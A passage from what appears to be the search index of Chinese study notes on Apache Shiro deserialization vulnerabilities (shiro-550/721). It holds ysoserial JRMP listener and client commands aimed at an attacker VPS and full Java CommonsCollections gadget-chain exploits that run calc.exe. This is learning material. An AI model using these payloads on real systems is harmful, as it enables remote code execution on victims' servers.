\u7136\u540e\u5236\u4f5ccookie\uff0c\u53d1\u8fc7\u53bb\uff0c\u6210\u529f\u5f39\u8ba1\u7b97\u5668","title":"cc\u94fe2"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#jrmp","text":"\u901a\u8fc7\u8fd0\u884cmvn dependency:list \u547d\u4ee4\u53ef\u4ee5\u53d1\u73b0\u5f53\u524dCommons Collections \u7684\u7248\u672c\u662f3.2.1 \u6309\u7406\u8bf4\u4f1a\u6709cc\u94fe5\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u7528ysoserial \u751f\u6210payload\u7528\u4e0a\u9762\u7684\u65b9\u6cd5\u6253\u8fc7\u53bb\u540e\u6ca1\u6709\u53cd\u5e94\u3002\u770b\u522b\u4eba\u535a\u5ba2\u53d1\u73b0\u662f\u8fd9\u4e2a\u539f\u56e0 \u201cShiro resovleClass\u4f7f\u7528\u7684\u662fClassLoader.loadClass()\u800c\u975eClass.forName()\uff0c\u800cClassLoader.loadClass\u4e0d\u652f\u6301\u88c5\u8f7d\u6570\u7ec4\u7c7b\u578b\u7684class\u3002\u201d \u89e3\u51b3\u8fd9\u79cd\u95ee\u9898\u7684\u529e\u6cd5\u662f\u7528JRMP vps\u4e0a\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff0c\u76d1\u542c\u7aef\u53e3 java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 12006 CommonsCollections5 'calc' \u6211\u4eec\u518d\u901a\u8fc7ysoserial\u751f\u6210payload java -jar ysoserial-master-SNAPSHOT.jar JRMPClient 'vps_ip:12006'|base64|sed ':label;N;s/\\n//;b label' \u7136\u540e\u4f2a\u9020cookie\uff0c\u53d1\u8fc7\u53bb\uff0c\u6210\u529f\u5f39\u8ba1\u7b97\u5668","title":"JRMP"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#_9","text":"\u8fd9\u4e2a\u6d1e\u56e0\u4e3acookie\u4e2d\u7684\u503c\u4f7f\u7528\u786c\u7f16\u7801\u7684key\u52a0\u5bc6\u800c\u6210\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee5\u6b64\u6765\u4f2a\u9020cookie\uff0c\u987a\u4fbf\u5728cookie\u91cc\u5199\u5165\u5371\u9669\u7684paylaod\u5982cc\u94fepayload\uff0c\u4f7fcookie\u4e2d\u7684\u503c\u88ab\u89e3\u5bc6\uff0c\u968f\u540e\u7ecf\u5386\u53cd\u5e8f\u5217\u5316\uff0c\u9020\u6210\u547d\u4ee4\u6267\u884c \u53c2\u8003\uff1a https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E \u7b11\u5e08\u5085\u5927\u5927","title":"\u5c0f\u603b\u7ed3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#_10","text":"\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u641c\u7d22\u5173\u952e\u5b57setCipherKey\u6216CookieRememberMeManager\uff0c\u6765\u770b\u770b\u5bc6\u94a5\u662f\u5426\u786c\u7f16\u7801\u5728\u4e86\u4ee3\u7801\u4e2d","title":"\u5ba1\u8ba1\u5173\u952e\u5b57"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#shiro-721","text":"\u53bb\u5e74\u5b66\u7684Padding Oracle \u5728\u6b64\u5904\u88ab\u5229\u7528\u4e86\u8d77\u6765\u3002\u53ef\u4ee5\u5148\u770b\u770bPadding Oracle Attack \u5927\u6982\u662f\u4e2a\u5565 \u5f71\u54cd\u7248\u672c\uff1a 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1","title":"shiro-721"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#_11","text":"\u5176\u5b9e\u6f0f\u6d1e\u4ee3\u7801\u5c42\u9762\u903b\u8f91\u4e0a\u548cshiro-550\u5927\u81f4\u76f8\u4f3c\uff0c\u53ea\u4e0d\u8fc7key\u6ca1\u6709\u786c\u7f16\u7801\u8fdb\u4ee3\u7801\u4e2d\u4e86\u3002shiro\u7684cookie\u4f7f\u7528aes-128-cbc\u52a0\u5bc6 \u53ea\u8981\u6211\u4eec\u83b7\u5f97\u4e00\u4e2arememberme\u7528\u6237\u7684cookie\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7padding oracle attack \u4f2a\u9020\u4efb\u610fcookie\u53d1\u8fc7\u53bb\u4e86\uff0c\u4ece\u800c\u9020\u6210\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u4e86","title":"\u7b80\u4ecb"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#_12","text":"\u5728\u8fd9\u91cc\u4e0b\u8f7d1.4.1\u7684war\u5305 https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war\uff0c\u5e76\u653e\u5165tomcat webapps\u6587\u4ef6\u5939\uff0c\u968f\u540e\u542f\u52a8tomcat\uff0c\u8bbf\u95ee http://127.0.0.1:8080/samples-web-1.4.1/","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#_13","text":"\u5927\u81f4\u903b\u8f91\u4e0eshiro-550\u5dee\u4e0d\u591a\uff0c\u76f4\u63a5\u8bf4\u5229\u7528\u5427\u3002 https://github.com/inspiringz/Shiro-721 \u4f7f\u7528\u8fd9\u4e2a\u5de5\u5177 \u9996\u5148\u6211\u4eec\u5f97\u52fe\u9009rememberme\uff0c\u6293\u5305\u83b7\u5f97rememberme cookie \u7136\u540e\u901a\u8fc7ysoserial\u751f\u6210payload\uff0c\u5c06\u5176\u901a\u8fc7\u7ba1\u9053\u7b26\u4f20\u5165\u67d0\u4e2a\u6587\u4ef6\uff0c\u968f\u540e\u7528\u521a\u521a\u90a3\u4e2a\u5de5\u5177\u91cc\u7684shiro_exp.py python ./shiro_exp.py <url> <cookie> <paylaod\u6587\u4ef6> \u968f\u540e\u4f1a\u8fdb\u884c\u7206\u7834\uff0c\u6700\u540e\u83b7\u5f97\u7ed3\u679ccookie\u540e\uff0c\u4f20\u5165\u5e76\u53d1\u5305\u8fc7\u53bb\u5373\u53ef\uff08\u7206\u7834\u65f6\u95f4\u5f88\u957f\uff09","title":"\u5229\u7528"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/","text":"shiro\u7684tricks \u76ee\u5f55 \u63a2\u6d4bShiro Key\u7684\u529e\u6cd5 key\u4e0d\u5bf9 key\u6b63\u786e \u63a2\u6d4b\u57fa\u51c6 Shiro CC\u94fe\u76f8\u5173\u95ee\u9898 \u65e0\u6570\u7ec4\u6539\u9020 JRMP\u4fe1\u9053 Serialize UID\u4e0d\u4e00\u81f4\u7ed5\u8fc7 \u6709\u53cd\u5e8f\u5217\u5316\u70b9\uff0c\u63a2\u6d4b\u5b58\u5728\u7684Gadget URLDNS \u53cd\u5e8f\u5217\u5316\u70b8\u5f39 \u63a2\u6d4bShiro Key\u7684\u529e\u6cd5 \u5728Shiro \u53cd\u5e8f\u5217\u5316rememberMe\u5b57\u6bb5\u65f6\uff0c\u4f1a\u7ecf\u8fc7\u8fd9\u4e2a\u65b9\u6cd5\u3002 AbstractRememberMeManager#getRememberedPrincipals \u6b63\u5e38\u7684\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u9014\u5f84\u662f\u5148\u4ecegetRememberedSerializedIdentity\u65b9\u6cd5\u4e2d\u83b7\u53d6rememberMe\u7684\u503c\uff0c\u7136\u540e\u8fdb\u884cCBC\u586b\u5145\uff0c\u7136\u540e\u8fdb\u884cBase64\u89e3\u5bc6 \u7136\u540e\u4ea4\u7ed9\u540e\u9762\u7684convertBytesToPrincipals\u8fdb\u884caes\u89e3\u5bc6\u5e76\u5c06\u7ed3\u679c\u53cd\u5e8f\u5217\u5316\u3002 key\u4e0d\u5bf9 \u5f53\u53cd\u5e8f\u5217\u5316\u65f6\uff0crememberMe\u7684key\u4e0d\u5bf9\uff0c\u4f1a\u5bfc\u81f4aes\u89e3\u5bc6\u5931\u8d25\uff0c\u4ea7\u751f\u62a5\u9519\u88ab\u4e0b\u9762\u7684catch\u5757\u63a5\u6536\u5230\u629b\u51fa\u5f02\u5e38\uff0c\u6211\u4eec\u770b\u770bcatch\u5757\u91cc\u9762\u7684onRememberedPrincipalFailure\u51fd\u6570\u662f\u4ec0\u4e48 \u9010\u6b65\u8ddf\u8fdb \u8ddf\u8fdb\u540e\u53d1\u73b0forgetIdentity \u83b7\u53d6\u4e86request\u3001response\u5bf9\u8c61\u5e76\u4ea4\u7ed9\u53e6\u4e00\u4e2a\u91cd\u6784\u65b9\u6cd5\u5904\u7406 \u8ddf\u8fdb\u540e\u518d\u8ddf\u8fdbremoveFrom \u53d1\u73b0\u5728\u8fd4\u56de\u5934\u91cc\u52a0\u4e86cookie\uff1arememberMe=deleteMe key\u6b63\u786e key\u6b63\u786e\uff0c\u5728\u4e00\u822c\u7684\u5229\u7528\u60c5\u51b5\u4e0b\u4f9d\u65e7\u4f1a\u88ab AbstractRememberMeManager#getRememberedPrincipals \u63a5\u53d7\u5f02\u5e38\u5e76\u629b\u51fa\uff0c\u7a76\u5176\u539f\u56e0\uff0c\u662f\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u4ee3\u7801\u4e2d\u4f7f\u7528\u4e86\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u800c\u6211\u4eec\u653b\u51fb\u65f6\u5e8f\u5217\u5316\u7684\u7c7b\u662f\u65e0\u6cd5\u8f6c\u6362\u4e3a PrincipalCoolection\u3002 \u4f46\u662f\u5982\u679c\u6211\u4eec\u5e8f\u5217\u5316\u7684\u7c7b\u662fPrincipalCollection\u7684\u53ef\u53cd\u5e8f\u5217\u5316\u5b50\u7c7b\uff0c\u90a3\u4e48\u5f53key\u6b63\u786e\u65f6\u54cd\u5e94\u5934\u5c06\u4e0d\u4f1a\u6709Set-Cookie: rememberMe=deleteMe\uff0ckey\u4e0d\u6b63\u786e\u65f6\u5219\u4f1a\u6709\uff0c\u4fbf\u53ef\u4ee5\u4ee5\u6b64\u4e3a\u57fa\u51c6\u68c0\u6d4bkey\u662f\u5426\u6b63\u786e\u3002 \u63a2\u6d4b\u57fa\u51c6 \u90a3\u4e48\u603b\u7ed3\u4e00\u4e0b\u4e0a\u9762\u7684\u4e24\u79cd\u60c5\u51b5\uff0c\u8981\u60f3\u8fbe\u5230\u53ea\u4f9d\u8d56shiro\u81ea\u8eab\u8fdb\u884ckey\u68c0\u6d4b\uff0c\u53ea\u9700\u8981\u6ee1\u8db3\u4e24\u70b9\uff1a 1.\u6784\u9020\u4e00\u4e2a\u7ee7\u627f PrincipalCollection \u7684\u5e8f\u5217\u5316\u5bf9\u8c61\u3002 2.key\u6b63\u786e\u60c5\u51b5\u4e0b\u4e0d\u8fd4\u56de deleteMe \uff0ckey\u9519\u8bef\u60c5\u51b5\u4e0b\u8fd4\u56de deleteMe \u3002 \u90a3\u4e48\u73b0\u5728\u5c31\u5b58\u5728\u7c7bSimplePrincipalCollection\uff0c\u5176\u7ee7\u627f\u81eaPrincipalCollection\u4e14\u53ef\u88ab\u53cd\u5e8f\u5217\u5316\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u7528\u8fd9\u4e2a\u7c7b\u6765\u63a2\u6d4bkey\u4e86\u3002 Shiro CC\u94fe\u76f8\u5173\u95ee\u9898 shiro\u4e2d\u53cd\u5e8f\u5217\u5316\u91cd\u5199\u4e86resolveClass\uff0c\u4e0d\u80fd\u5904\u7406\u6570\u7ec4\uff0c\u6240\u4ee5\u4e00\u4e9bcc\u94fe\u5728shiro\u4e2d\u7528\u5c31\u4f1a\u6709\u95ee\u9898\u3002 \u65e0\u6570\u7ec4\u6539\u9020 \u80fd\u6539\u9020\u6210\u65e0\u6570\u7ec4\u5f62\u5f0f\u7684CC\u94fe\u53ea\u6709 cc2\u3001cc3\u3001cc6 cc2 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\").getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); //cc.writeFile(); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"blckder02\"); setFieldValue(templates, \"_class\", null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2.bin\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class<?> clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } cc3 package com.shiroTest; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class CC3 { public byte[] getPayload2() throws Exception{ byte[] bytes = Base64.getDecoder().decode(\"yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAhTGNvbS9UZW1wbGFzdGVzSW1wbFRlc3QvY29kZVRlc3Q7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACUBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgcAJgEAClNvdXJjZUZpbGUBAA1jb2RlVGVzdC5qYXZhDAAZABoHACcMACgAKQEABGNhbGMMACoAKwEAH2NvbS9UZW1wbGFzdGVzSW1wbFRlc3QvY29kZVRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAABEACwAAACAAAwAAAAEADAANAAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAABYACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEAFwAYAAMAEgAAAAQAAQATAAEAGQAaAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAAGAAEABkADQAaAAsAAAAMAAEAAAAOAAwADQAAABIAAAAEAAEAGwABABwAAAACAB0=\"); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,\"_bytecodes\",new byte[][]{bytes}); setFieldValue(templates,\"_name\",\"dwa\"); setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl()); Transformer transformers = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}); HashMap<Object, Object> map = new HashMap<>(); Map<Object,Object> lazymap = LazyMap.decorate(map, new ConstantTransformer(1)); //\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684map // get\u65b9\u6cd5\u4e2d\u8c03\u7528\u7684\u662fmap.get // \u76ee\u7684\u662f\u8c03\u7528lazyMap\u4e2d\u7684get\u65b9\u6cd5 \u6240\u4ee5\u7b2c\u4e00\u4e2a\u53c2\u6570\u662flazyMap TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\")); HashMap<Object, Object> map2 = new HashMap<>(); //hashMap\u7684readObject\u65f6\u4f1a\u8c03\u7528hash\u65b9\u6cd5 // \u7136\u540ekey.hashCode() \u4f1a\u8c03\u7528key\u7684hashCode\u65b9\u6cd5 key\u7684\u503c\u4e3atiedMapEntry //\u8c03\u7528tiedMapEntry\u7684hashCode\u7136\u540e\u5f85\u7528getValue\u65b9\u6cd5 \u7136\u540e\u8c03\u7528get\u65b9\u6cd5 map2.put(tiedMapEntry, \"sss\"); lazymap.remove(Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\")); Class c = LazyMap.class; Field factoryField = c.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(lazymap,transformers); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr); objectOutputStream.writeObject(map2); objectOutputStream.close(); return barr.toByteArray(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } cc6 package org.payload.cc.CC6; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import org.Tools.ClassTools; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import java.io.ByteArrayInputStream; import java.io.ObjectInputStream; import java.util.*; import static org.Tools.ClassTools.setFieldValue; public class CommonsCollections6TemplatesImpl { public Map CommonsCollections6TemplatesImpl(String args) throws Exception { ClassTools ct = new ClassTools(); byte[] evilClass = ct.MakeEvilClass(\"org.Tools.evilclass.EvilClass\"); //byte[] evilClass = evilClass2(\"java.lang.Runtime.getRuntime().exec(\\\"\"+args+\"\\\");\"); TemplatesImpl tmp = ct.template(evilClass); InvokerTransformer transformer = new InvokerTransformer(\"toString\", null, null); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformer); TiedMapEntry tme = new TiedMapEntry(outerMap, tmp); Map expMap = new HashMap(); expMap.put(tme, \"valuevalue\"); outerMap.clear(); setFieldValue(transformer, \"iMethodName\", \"newTransformer\"); return expMap; } public static byte[] CommonsCollections6TemplatesImplPayload(String args) throws Exception { ClassTools ct = new ClassTools(); CommonsCollections6TemplatesImpl commonsCollections6Templates = new CommonsCollections6TemplatesImpl(); Object evil = commonsCollections6Templates.CommonsCollections6TemplatesImpl(args); return ct.serial(evil); } public static void main(String[] args) throws Exception { byte[] evilByteClass = CommonsCollections6TemplatesImplPayload(\"calc.exe\"); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(evilByteClass)); ois.readObject(); } } JRMP\u4fe1\u9053 \u5f53\u7136\uff0c\u5982\u679cJRMP\u8054\u901a\u4e86\uff0c\u76f4\u63a5\u8d70JRMP\u901a\u9053\u62ff\u5565\u90fd\u53ef\u4ee5\u6253\u4e86 vps\u4e0a\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff0c\u76d1\u542c\u7aef\u53e3 java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 12006 CommonsCollections5 'calc' \u6211\u4eec\u518d\u901a\u8fc7ysoserial\u751f\u6210payload java -jar ysoserial-master-SNAPSHOT.jar JRMPClient 'vps_ip:12006'|base64|sed ':label;N;s/\\n//;b label' \u7136\u540e\u4f2a\u9020cookie\uff0c\u53d1\u8fc7\u53bb\uff0c\u6210\u529f\u5f39\u8ba1\u7b97\u5668 Serialize UID\u4e0d\u4e00\u81f4\u7ed5\u8fc7 \u5728\u653b\u51fb\u65f6\uff0c\u5982\u679c\u6784\u9020\u7684\u5e8f\u5217\u5316\u5bf9\u8c61SUID\u548c\u76ee\u6807\u4e0a\u7684\u5bf9\u8c61SUID\u4e0d\u4e00\u81f4\uff0c\u5219\u65e0\u6cd5\u5b8c\u6210\u53cd\u5e8f\u5217\u5316\u629b\u51fa\u9519\u8bef\u3002 \u6838\u5fc3\u68c0\u6d4b\u4ee3\u7801\u5982\u4e0b // SUID\u68c0\u67e5\u6761\u4ef6\uff1a\u662f\u5426\u90fd\u6216\u90fd\u6ca1\u6709\u5b9e\u73b0\u4e86Serializable\u63a5\u53e3 && \u4e0d\u662f\u6570\u7ec4\u7c7b && suid\u4e0d\u76f8\u540c if (serializable == localDesc.serializable && !cl.isArray() && suid.longValue() != localDesc.getSerialVersionUID()) { throw new InvalidClassException(localDesc.name, \"local class incompatible: \" + \"stream classdesc serialVersionUID = \" + suid + \", local class serialVersionUID = \" + localDesc.getSerialVersionUID()); } \u52a8\u6001\u751f\u6210\u4e00\u4e2aA\u7c7b\u4e0d\u5b9e\u73b0Serializable\u63a5\u53e3\u8fdb\u884c\u5e8f\u5217\u5316\u3002\u5982\u679c\u7ebf\u4e0a\u7684A\u7c7b\u662f\u5b9e\u73b0Serializable\u63a5\u53e3\uff0c\u7b2c\u4e00\u4e2a\u6761\u4ef6\u5c31\u4e0d\u6210\u7acb\u4e86\u76f4\u63a5\u7ed5\u8fc7\u3002\u5982\u679c\u7ebf\u4e0a\u7684Class\u6ca1\u6709\u5b9e\u73b0\u6539\u63a5\u53e3\uff0c\u5219\u4e24\u8005suid\u90fd\u4e3a0L,\u7b2c\u4e09\u4e2a\u6761\u4ef6\u4e0d\u7b26\u5408\uff0c\u81ea\u7136\u65e0\u9700\u68c0\u67e5\u3002 \u76f4\u63a5\u5e8f\u5217\u5316A[].class\uff0c\u7b2c\u4e8c\u4e2a\u6761\u4ef6\u76f4\u63a5\u4e0d\u7b26\u5408\uff0c\u76f4\u63a5\u4e0d\u7528\u68c0\u67e5SUID\uff0c\u65e0\u9700\u5173\u5fc3\u5b9e\u73b0\u5b9e\u73b0Serializable\u63a5\u53e3\u3002 \u6709\u53cd\u5e8f\u5217\u5316\u70b9\uff0c\u63a2\u6d4b\u5b58\u5728\u7684Gadget ref\uff1a https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==\\&mid=2247484178\\&idx=1\\&sn=228ccc3d624f2d64a6c1d51555c42eea\\&chksm=cf36fb52f8417244ea608ea14da45b876548617864179c8da6df46010bed78aa41c4a2277cb8\\&mpshare=1\\&scene=23\\&srcid=0223h9KLw3Bpv4B57cmWkp7z\\&sharer_sharetime=1645787561952\\&sharer_shareid=ff51a992c5bfd7616a29069bf0989669#rd URLDNS URLDNS\u94fe\u6709\u5982\u4e0b\u4ee3\u7801 // java.util.HashMap#readObject private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { ...... // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i < mappings; i++) { @SuppressWarnings(\"unchecked\") K key = (K) s.readObject(); @SuppressWarnings(\"unchecked\") V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } 